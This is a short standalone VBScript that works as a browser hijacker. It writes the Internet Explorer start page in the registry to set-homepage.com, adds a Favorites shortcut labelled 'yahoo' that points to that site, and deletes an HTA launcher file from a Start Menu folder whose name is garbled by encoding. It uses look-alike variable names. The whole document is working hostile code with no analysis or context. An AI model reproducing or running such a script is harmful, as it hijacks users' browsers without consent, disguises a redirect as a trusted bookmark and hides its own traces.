xxyy1="http://www.set-homepage.com/"
xxyyl="yahoo"
Set WSHShell = WScript.CreateObject("WScript.Shell")
WSHShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page", xxyy1
Set oUrlLink = WshShell.CreateShortcut(Wscript.path & "\favorites\" & xxyyl & ".lnk")
oUrlLink.TargetPath = xxyy1
oUrlLink.Save
Set fs = CreateObject("Scripting.FileSystemObject")
if fs.FileExists(wscript.path & "\Start Menu\Programs\����\Myhta.hta") then
fs.deletefile(wscript.path & "\Start Menu\Programs\����\Myhta.hta")
end if
